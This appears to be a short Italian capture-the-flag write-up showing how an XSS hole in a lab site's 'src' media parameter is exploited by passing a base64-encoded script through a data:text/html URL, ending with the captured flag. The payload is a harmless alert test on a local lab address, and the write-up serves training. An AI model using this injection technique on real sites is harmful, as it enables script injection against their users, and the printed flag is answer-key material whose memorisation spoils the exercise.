# XSS META Data
Nella home del sito l'unica immagine cliccabile (National Security Agency) porta al seguente link:
```
http://192.168.56.134/?page=media&src=nsa
```
Dopo un po di prove con i diversi tipi di attacchi XSS arrivo alla flag usando un attacco che 
modifica i meta passando lo script in base64, lo script che ho usato è:
```html
<script>alert('test')</script>
``` 
che in base64 diventa:
```
PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
```
Così ho composto il seguente link:
```
http://192.168.56.134/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
```
Arrivando alla flag:
```
928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```
